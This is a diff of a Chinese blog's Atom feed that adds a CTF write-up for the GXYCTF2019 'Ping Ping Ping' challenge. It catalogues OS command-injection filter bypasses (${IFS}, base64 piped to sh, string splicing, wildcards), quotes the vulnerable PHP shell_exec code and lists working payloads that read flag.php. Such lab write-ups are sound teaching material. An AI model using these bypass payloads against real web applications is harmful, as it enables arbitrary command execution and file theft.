@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>小张的博客</title>
-    <updated>2020-05-15T04:23:49.609Z</updated>
+    <updated>2020-05-21T01:12:41.734Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,106 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 小张的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[[GXYCTF2019]Ping Ping Ping—os命令总结]]></title>
+        <id>https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/</id>
+        <link href="https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/">
+        </link>
+        <updated>2020-05-21T00:34:14.000Z</updated>
+        <content type="html"><![CDATA[<p>打开环境，是如下页面<br>
+<img src="https://zhangzy999.github.io//post-images/1590021358928.png" alt="" loading="lazy"><br>
+应该是让我们用get方法传一个参数ip，然后执行系统的ping命令，我们ls一下看看页面是如何回显的<br>
+<img src="https://zhangzy999.github.io//post-images/1590021468013.png" alt="" loading="lazy"><br>
+有flag.php和index.php，直接访问不会有回显，猜测flag在注释里面，那我们cat一下flag.php<br>
+<img src="https://zhangzy999.github.io//post-images/1590021575630.png" alt="" loading="lazy"><br>
+显示&quot;fxck your space&quot;……<br>
+应该是过滤了空格emm，那么我们先总结一下os命令执行的常见的绕过方法：<br>
+1，过滤空格：</p>
+<pre><code>过滤空格：可以用以下字符代替
+&lt;&gt;
+&lt;
+${IFS}
+$IFS$1
+{cat,flag.php}
+</code></pre>
+<p>2，过滤关键字或者一些纳入黑名单的敏感文件名：</p>
+<pre><code>黑名单	绕过：
+拼接：cat test.txt  =  a=c;b=at;c=test;d=.txt $a$b $c$d 
+base64编码:  `echo Y2F0IHRlc3QudHh0|base64 -d`
+               echo Y2F0IHRlc3QudHh0|base64 -d|bash
+               echo Y2F0IHRlc3QudHh0|base64 -d|sh
+单双引号：ca''t tes&quot;&quot;t.txt
+反斜线：ca\t tes\t.txt
+$符号：ca$@t te$9st.txt
+cat等价替换：more less head tac tail vim等等……
+通配符：
+/???/?at ????.???
+/???/?[a][t] ????.???
+</code></pre>
+<p>3，做长度上的限制：</p>
+<pre><code>长度限制 绕过：
+（&gt;是写入一个文件，但是内容会清空，&gt;&gt;是在文件末尾追加，\是换行符）
+echo  &quot;cat\\&quot; &gt; cmd
+echo &quot;tes\\&quot;&gt;&gt;cmd
+echo &quot;t.txt&quot;&gt;&gt;cmd
+sh cmd
+</code></pre>
+<p>有了以上办法，它既然过滤了空格，我们用以下几种形式来代替</p>
+<pre><code>1: ?ip=1|cat${IFS}flag.php
+2: ?ip=1|cat&lt;&gt;flag.php
+3: ?ip=1|cat&lt;flag.php
+4: ?ip=1|{cat,flag.php}
+5: ?ip=1|cat$IFS$1flag.php
+</code></pre>
+<p>前四种方法都是&quot;fxck your symbol!&quot;，猜测是对特殊字符做了过滤，但是cao dan的是我们不知道过滤了啥<br>
+<img src="https://zhangzy999.github.io//post-images/1590022142460.png" alt="" loading="lazy"><br>
+第五种方法可以！<br>
+<img src="https://zhangzy999.github.io//post-images/1590022258690.png" alt="" loading="lazy"><br>
+没有fxck your space，space，而是fuck flag……<br>
+没事儿，既然能突破前两重限制，那应该离胜利不远了，尝试拼接法拼flag无果后，我们读一下index.php</p>
+<pre><code>?ip=1|cat$IFS$1index.php
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://zhangzy999.github.io//post-images/1590022474723.png" alt="" loading="lazy"></figure>
+<pre><code class="language-php">&lt;?php
+if(isset($_GET['ip'])){
+  $ip = $_GET['ip'];
+  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
+    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  } else if(preg_match(&quot;/ /&quot;, $ip)){
+    die(&quot;fxck your space!&quot;);
+  } else if(preg_match(&quot;/bash/&quot;, $ip)){
+    die(&quot;fxck your bash!&quot;);
+  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+    die(&quot;fxck your flag!&quot;);
+  }
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+  echo &quot;&lt;pre&gt;&quot;;
+  print_r($a);
+}
+?&gt;
+</code></pre>
+<p>可以看到上面就是我们的过滤规则了，推荐一个调试正则的网站：https://regex101.com<br>
+我们已经突破前两重过滤，我们直接看最后一个带有flag的过滤规则就好<br>
+<img src="https://zhangzy999.github.io//post-images/1590022906117.png" alt="" loading="lazy"><br>
+可以看到只要有flag出现就不可以，无论它们中间有多少字符，但是咧，不出现flag.php<br>
+出现f$a是不会触发正则的，我们可以用拼接法来拼接flag：</p>
+<pre><code>?ip=1;a=lag.php;cat$IFS$1f$a;
+</code></pre>
+<p><img src="https://zhangzy999.github.io//post-images/1590023132426.png" alt="" loading="lazy"><br>
+bingo!<br>
+当然还有以下三种解法<br>
+1，(看源码知道bash被过滤)我们用sh来代替进行base64编码</p>
+<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre>
+<p>2，反引号里面的字符串会被当作命令执行</p>
+<pre><code>?ip=1;`echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d`
+</code></pre>
+<p>3，反引号里面的字符串不仅可以被当作命令执行，命令执行的结果还可被当作输入</p>
+<pre><code>?ip=1;cat$IFS$1`ls`   等价于    cat flag.php index.php
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[BUUweb—checkIn，利用.user.ini上传木马]]></title>
         <id>https://zhangzy999.github.io/post/webcheckIn/</id>
